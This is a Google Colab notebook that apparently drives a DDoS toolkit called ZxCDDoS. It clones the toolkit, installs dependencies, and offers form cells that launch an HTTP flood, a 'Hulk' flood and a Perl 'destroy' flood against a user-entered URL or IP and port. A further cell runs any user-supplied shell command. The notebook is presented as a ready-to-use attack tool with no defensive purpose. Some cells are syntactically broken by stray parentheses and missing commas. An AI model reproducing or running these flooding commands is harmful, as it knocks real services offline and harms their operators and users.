{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO7eJb9kL3n/kq4OrR6eLCQ",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/nalayakofficial/ZxCDDoS/blob/main/colab.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "k6eqsjp9Un1a",
        "cellView": "form"
      },
      "outputs": [],
      "source": [
        "\n",
        "#@title **Download**\n",
        "#@markdown  Download And Setup\n",
        "\n",
        "\n",
        "\n",
        "import subprocess\n",
        "\n",
        "commands = [\n",
        "    \"apt update\",\n",
        "    \"git clone https://github.com/nalayakofficial/ZxCDDoS\",\n",
        "    \"pip install -r ZxCDDoS/requirements.txt\",\n",
        "    \"apt install golang\",\n",
        "    \"apt install python2\"\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "#@title **httpflood**\n",
        "#@markdown  Flood Http\n",
        "\n",
        "\n",
        "\n",
        "import subprocess\n",
        "\n",
        "url = \"\" #@param {type:\"string\"}\n",
        "time = 600 #@param {type: \"integer\"}\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    f'go run httpflood.go {url} 100000 get {time} nil &'\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ],
      "metadata": {
        "id": "59VMC_UfWeIV",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "#@title **crash**\n",
        "#@markdown  Crash\n",
        "\n",
        "\n",
        "\n",
        "import subprocess\n",
        "\n",
        "url = \"\" #@param {type:\"string\"}\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    f'go run Hulk.go -site {url} -data GET &'\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ],
      "metadata": {
        "id": "jzn6iRTUZJ72",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "#@title **crash**\n",
        "#@markdown  Crash\n",
        "\n",
        "\n",
        "\n",
        "import subprocess\n",
        "\n",
        "\n",
        "ip = \"\" #@param {type:\"string\"}\n",
        "port = \"\" #@param {type:\"string\"}\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    f'perl destroy.pl {ip} {port} 65500 600 &'\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True))"
      ],
      "metadata": {
        "id": "Xz_9fELhZfc8",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "#@title **Custom**\n",
        "#@markdown  Custom\n",
        "\n",
        "\n",
        "\n",
        "import subprocess\n",
        "\n",
        "\n",
        "command = \"\" #@param {type:\"string\"}\n",
        "\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    command,\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True))"
      ],
      "metadata": {
        "cellView": "form",
        "id": "0T_dp0dXdehq"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}